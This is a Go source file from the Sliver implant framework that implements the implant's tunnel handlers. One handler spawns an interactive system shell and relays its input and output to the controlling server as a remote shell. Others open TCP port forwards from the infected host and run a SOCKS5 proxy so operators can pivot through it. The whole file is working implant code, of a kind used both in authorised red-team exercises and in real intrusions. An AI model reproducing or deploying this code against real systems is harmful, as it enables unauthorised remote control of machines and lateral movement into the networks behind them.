package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io"
	"net"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/shell"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/things-go/go-socks5"
	"google.golang.org/protobuf/proto"
)

var (
	tunnelHandlers = map[uint32]TunnelHandler{
		sliverpb.MsgShellReq:   shellReqHandler,
		sliverpb.MsgPortfwdReq: portfwdReqHandler,
		sliverpb.MsgSocksData:  socksReqHandler,

		sliverpb.MsgTunnelData:  tunnelDataHandler,
		sliverpb.MsgTunnelClose: tunnelCloseHandler,
	}

	// TunnelID -> Sequence Number -> Data
	tunnelDataCache = dataCache{mutex: &sync.RWMutex{}, cache: map[uint64]map[uint64]*sliverpb.TunnelData{}}
)

type dataCache struct {
	mutex *sync.RWMutex
	cache map[uint64]map[uint64]*sliverpb.TunnelData
}

func (c *dataCache) Add(tunnelID uint64, sequence uint64, tunnelData *sliverpb.TunnelData) {
	c.mutex.Lock()
	defer c.mutex.Unlock()

	if _, ok := c.cache[tunnelID]; !ok {
		c.cache[tunnelID] = map[uint64]*sliverpb.TunnelData{}
	}

	c.cache[tunnelID][sequence] = tunnelData
}

func (c *dataCache) Get(tunnelID uint64, sequence uint64) (*sliverpb.TunnelData, bool) {
	c.mutex.RLock()
	defer c.mutex.RUnlock()

	if _, ok := c.cache[tunnelID]; !ok {
		return nil, false
	}

	val, ok := c.cache[tunnelID][sequence]

	return val, ok
}

func (c *dataCache) DeleteTun(tunnelID uint64) {
	c.mutex.Lock()
	defer c.mutex.Unlock()

	delete(c.cache, tunnelID)
}

func (c *dataCache) DeleteSeq(tunnelID uint64, sequence uint64) {
	c.mutex.Lock()
	defer c.mutex.Unlock()

	if _, ok := c.cache[tunnelID]; !ok {
		return
	}

	delete(c.cache[tunnelID], sequence)
}

func (c *dataCache) Len(tunnelID uint64) int {
	c.mutex.RLock()
	defer c.mutex.RUnlock()

	return len(c.cache[tunnelID])
}

// GetTunnelHandlers - Returns a map of tunnel handlers
func GetTunnelHandlers() map[uint32]TunnelHandler {
	// {{if .Config.Debug}}
	log.Printf("[tunnel] Tunnel handlers %v", tunnelHandlers)
	// {{end}}
	return tunnelHandlers
}

func tunnelCloseHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	tunnelClose := &sliverpb.TunnelData{
		Closed: true,
	}
	proto.Unmarshal(envelope.Data, tunnelClose)
	tunnel := connection.Tunnel(tunnelClose.TunnelID)
	if tunnel != nil {
		// {{if .Config.Debug}}
		log.Printf("[tunnel] Closing tunnel with id %d", tunnel.ID)
		// {{end}}
		connection.RemoveTunnel(tunnel.ID)
		tunnel.Reader.Close()
		tunnel.Writer.Close()
		tunnelDataCache.DeleteTun(tunnel.ID)
	} else {
		// {{if .Config.Debug}}
		log.Printf("[tunnel][tunnelCloseHandler] Received close message for unknown tunnel id %d", tunnelClose.TunnelID)
		// {{end}}
	}
}

func tunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	tunnelData := &sliverpb.TunnelData{}
	proto.Unmarshal(envelope.Data, tunnelData)
	tunnel := connection.Tunnel(tunnelData.TunnelID)
	if tunnel != nil {
		// Since we have no guarantees that we will receive tunnel data in the correct order, we need
		// to ensure we write the data back to the reader in the correct order. The server will ensure
		// that TunnelData protobuf objects are numbered in the correct order using the Sequence property.
		// Similarly we ensure that any data we write-back to the server is also numbered correctly. To
		// reassemble the data, we just dump it into the cache and then advance the writer until we no longer
		// have sequential data. So we can receive `n` number of incorrectly ordered Protobuf objects and
		// correctly write them back to the reader.

		// {{if .Config.Debug}}
		log.Printf("[tunnel] Cache tunnel %d (seq: %d)", tunnel.ID, tunnelData.Sequence)
		// {{end}}

		tunnelDataCache.Add(tunnel.ID, tunnelData.Sequence, tunnelData)

		// NOTE: The read/write semantics can be a little mind boggling, just remember we're reading
		// from the server and writing to the tunnel's reader (e.g. stdout), so that's why ReadSequence
		// is used here whereas WriteSequence is used for data written back to the server

		// Go through cache and write all sequential data to the reader
		for recv, ok := tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()); ok; recv, ok = tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()) {
			// {{if .Config.Debug}}
			log.Printf("[tunnel] Write %d bytes to tunnel %d (read seq: %d)", len(recv.Data), recv.TunnelID, recv.Sequence)
			// {{end}}
			tunnel.Writer.Write(recv.Data)

			// Delete the entry we just wrote from the cache
			tunnelDataCache.DeleteSeq(tunnel.ID, tunnel.ReadSequence())
			tunnel.IncReadSequence() // Increment sequence counter

			// {{if .Config.Debug}}
			log.Printf("[message just received] %v", tunnelData)
			// {{end}}
		}

		//If cache is building up it probably means a msg was lost and the server is currently hung waiting for it.
		//Send a Resend packet to have the msg resent from the cache
		if tunnelDataCache.Len(tunnel.ID) > 3 {
			data, err := proto.Marshal(&sliverpb.TunnelData{
				Sequence: tunnel.WriteSequence(), // The tunnel write sequence
				Ack:      tunnel.ReadSequence(),
				Resend:   true,
				TunnelID: tunnel.ID,
				Data:     []byte{},
			})
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[shell] Failed to marshal protobuf %s", err)
				// {{end}}
			} else {
				// {{if .Config.Debug}}
				log.Printf("[tunnel] Requesting resend of tunnelData seq: %d", tunnel.ReadSequence())
				// {{end}}
				connection.RequestResend(data)
			}
		}

	} else {
		// {{if .Config.Debug}}
		log.Printf("[tunnel] Received data for nil tunnel %d", tunnelData.TunnelID)
		log.Printf("[message just transfered] %v", tunnelData)
		// {{end}}
	}
}

// tunnelWriter - Sends data back to the server based on data read()
// I know the reader/writer stuff is a little hard to keep track of
type tunnelWriter struct {
	tun  *transports.Tunnel
	conn *transports.Connection
}

func (tw tunnelWriter) Write(data []byte) (int, error) {
	n := len(data)
	data, err := proto.Marshal(&sliverpb.TunnelData{
		Sequence: tw.tun.WriteSequence(), // The tunnel write sequence
		Ack:      tw.tun.ReadSequence(),
		TunnelID: tw.tun.ID,
		Data:     data,
	})
	// {{if .Config.Debug}}
	log.Printf("[tunnelWriter] Write %d bytes (write seq: %d) ack: %d, data: %s", n, tw.tun.WriteSequence(), tw.tun.ReadSequence(), data)
	// {{end}}
	tw.tun.IncWriteSequence() // Increment write sequence
	tw.conn.Send <- &sliverpb.Envelope{
		Type: sliverpb.MsgTunnelData,
		Data: data,
	}
	return n, err
}

func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {

	shellReq := &sliverpb.ShellReq{}
	err := proto.Unmarshal(envelope.Data, shellReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] Failed to unmarshal protobuf %s", err)
		// {{end}}
		return
	}

	shellPath := shell.GetSystemShellPath(shellReq.Path)
	systemShell, err := shell.StartInteractive(shellReq.TunnelID, shellPath, shellReq.EnablePTY)
	if systemShell == nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] Failed to get system shell")
		// {{end}}
		return
	}

	// At this point, comand is already started by StartInteractive
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] Failed to spawn! err: %v", err)
		// {{end}}
		return
	} else {
		// {{if .Config.Debug}}
		log.Printf("[shell] Process spawned!")
		// {{end}}
	}

	tunnel := transports.NewTunnel(
		shellReq.TunnelID,
		systemShell.Stdout,
		systemShell.Stdin,
	)
	connection.AddTunnel(tunnel)

	shellResp, _ := proto.Marshal(&sliverpb.Shell{
		Pid:      uint32(systemShell.Command.Process.Pid),
		Path:     shellReq.Path,
		TunnelID: shellReq.TunnelID,
	})
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.ID,
		Data: shellResp,
	}

	// Cleanup function with arguments
	cleanup := func(reason string) {
		// {{if .Config.Debug}}
		log.Printf("[shell] Closing tunnel request %d (%s)", tunnel.ID, reason)
		// {{end}}
		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
			Closed:   true,
			TunnelID: tunnel.ID,
		})
		connection.Send <- &sliverpb.Envelope{
			Type: sliverpb.MsgTunnelClose,
			Data: tunnelClose,
		}
	}

	go func() {
		tWriter := tunnelWriter{
			tun:  tunnel,
			conn: connection,
		}
		_, err := io.Copy(tWriter, tunnel.Reader)

		systemShell.Wait() // sync wait, since we already locked in io.Copy, and it will release once it's done

		if systemShell.Command.ProcessState != nil {
			if systemShell.Command.ProcessState.Exited() {
				cleanup("process terminated")
				return
			}
		}
		if err == io.EOF {
			cleanup("EOF")
			return
		}
	}()

	// {{if .Config.Debug}}
	log.Printf("[shell] Started shell with tunnel ID %d", tunnel.ID)
	// {{end}}

}

func portfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	portfwdReq := &sliverpb.PortfwdReq{}
	err := proto.Unmarshal(envelope.Data, portfwdReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Failed to unmarshal protobuf %s", err)
		// {{end}}
		return
	}

	var defaultDialer = new(net.Dialer)

	// TODO: Configurable context
	remoteAddress := fmt.Sprintf("%s:%d", portfwdReq.Host, portfwdReq.Port)
	// {{if .Config.Debug}}
	log.Printf("[portfwd] Dialing -> %s", remoteAddress)
	// {{end}}

	ctx, cancelContext := context.WithCancel(context.Background())

	dst, err := defaultDialer.DialContext(ctx, "tcp", remoteAddress)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Failed to dial remote address %s", err)
		// {{end}}
		cancelContext()
		return
	}
	if conn, ok := dst.(*net.TCPConn); ok {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Configuring keep alive")
		// {{end}}
		conn.SetKeepAlive(true)
		// TODO: Make KeepAlive configurable
		conn.SetKeepAlivePeriod(30 * time.Second)
	}

	// Add tunnel
	// {{if .Config.Debug}}
	log.Printf("[portfwd] Creating tcp tunnel")
	// {{end}}
	tunnel := transports.NewTunnel(
		portfwdReq.TunnelID,
		dst,
		dst,
	)
	connection.AddTunnel(tunnel)

	// Send portfwd response
	portfwdResp, _ := proto.Marshal(&sliverpb.Portfwd{
		Port:     portfwdReq.Port,
		Host:     portfwdReq.Host,
		Protocol: sliverpb.PortFwdProtoTCP,
		TunnelID: portfwdReq.TunnelID,
	})
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.ID,
		Data: portfwdResp,
	}

	cleanup := func(reason error) {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Closing tunnel %d (%s)", tunnel.ID, reason)
		// {{end}}
		tunnel := connection.Tunnel(tunnel.ID)

		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
			Closed:   true,
			TunnelID: tunnel.ID,
		})
		connection.Send <- &sliverpb.Envelope{
			Type: sliverpb.MsgTunnelClose,
			Data: tunnelClose,
		}
		connection.RemoveTunnel(tunnel.ID)
		dst.Close()
		cancelContext()
	}

	go func() {
		tWriter := tunnelWriter{
			tun:  tunnel,
			conn: connection,
		}
		n, err := io.Copy(tWriter, tunnel.Reader)

		// {{if .Config.Debug}}
		log.Printf("[tunnel] Tunnel done, wrote %v bytes", n)
		// {{end}}

		cleanup(err)
	}()
}

type socksTunnelPool struct {
	tunnels    map[uint64]chan []byte
	readMutex  *sync.Mutex
	writeMutex *sync.Mutex
	Sequence   map[uint64]uint64
}

var socksTunnels = socksTunnelPool{
	tunnels:    map[uint64]chan []byte{},
	readMutex:  &sync.Mutex{},
	writeMutex: &sync.Mutex{},
	Sequence:   map[uint64]uint64{},
}

var socksServer *socks5.Server

func socksReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	socksData := &sliverpb.SocksData{}
	err := proto.Unmarshal(envelope.Data, socksData)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[socks] Failed to unmarshal protobuf %s", err)
		// {{end}}
		return
	}
	if socksData.Data == nil {
		return
	}
	// {{if .Config.Debug}}
	log.Printf("[socks] User to Client to (server to implant) Data Sequence %d, Data Size %d\n", socksData.Sequence, len(socksData.Data))
	// {{end}}

	if socksData.Username != "" && socksData.Password != "" {
		cred := socks5.StaticCredentials{
			socksData.Username: socksData.Password,
		}
		auth := socks5.UserPassAuthenticator{Credentials: cred}
		socksServer = socks5.NewServer(
			socks5.WithAuthMethods([]socks5.Authenticator{auth}),
		)
	} else {
		socksServer = socks5.NewServer()
	}

	// {{if .Config.Debug}}
	log.Printf("[socks] Server: %v", socksServer)
	// {{end}}

	// init tunnel
	if _, ok := socksTunnels.tunnels[socksData.TunnelID]; !ok {
		socksTunnels.tunnels[socksData.TunnelID] = make(chan []byte, 10)
		socksTunnels.tunnels[socksData.TunnelID] <- socksData.Data
		err := socksServer.ServeConn(&socks{stream: socksData, conn: connection})
		if err != nil {
			return
		}
	} else {
		socksTunnels.tunnels[socksData.TunnelID] <- socksData.Data
	}
}

var _ net.Conn = &socks{}

type socks struct {
	stream *sliverpb.SocksData
	conn   *transports.Connection
	// mux      sync.Mutex
	Sequence uint64
}

func (s *socks) Read(b []byte) (n int, err error) {
	socksTunnels.readMutex.Lock()
	channel := socksTunnels.tunnels[s.stream.TunnelID]
	socksTunnels.readMutex.Unlock()
	data := <-channel
	return copy(b, data), nil
}

func (s *socks) Write(b []byte) (n int, err error) {
	socksTunnels.writeMutex.Lock()
	data, err := proto.Marshal(&sliverpb.SocksData{
		TunnelID: s.stream.TunnelID,
		Data:     b,
		Sequence: s.Sequence,
	})
	if !s.conn.IsOpen {
		return 0, err
	}
	// {{if .Config.Debug}}
	log.Printf("[socks] (implant to Server) to Client to User Data Sequence %d, Data Size %d Data %v\n", s.Sequence, len(b), b)
	// {{end}}
	s.conn.Send <- &sliverpb.Envelope{
		Type: sliverpb.MsgSocksData,
		Data: data,
	}
	socksTunnels.writeMutex.Unlock()
	s.Sequence++
	return len(b), err
}

func (s *socks) Close() error {
	close(socksTunnels.tunnels[s.stream.TunnelID])
	delete(socksTunnels.tunnels, s.stream.TunnelID)
	data, err := proto.Marshal(&sliverpb.SocksData{
		TunnelID:  s.stream.TunnelID,
		CloseConn: true,
	})
	if !s.conn.IsOpen {
		return err
	}
	s.conn.Send <- &sliverpb.Envelope{
		Type: sliverpb.MsgSocksData,
		Data: data,
	}
	return err
}

func (c *socks) LocalAddr() net.Addr {
	return nil
}

func (c *socks) RemoteAddr() net.Addr {
	return &net.IPAddr{
		IP:   net.IPv4(127, 0, 0, 1),
		Zone: "",
	}
}

// TODO impl
func (c *socks) SetDeadline(t time.Time) error {
	return nil
}

// TODO impl
func (c *socks) SetReadDeadline(t time.Time) error {
	return nil
}

// TODO impl
func (c *socks) SetWriteDeadline(t time.Time) error {
	return nil
}
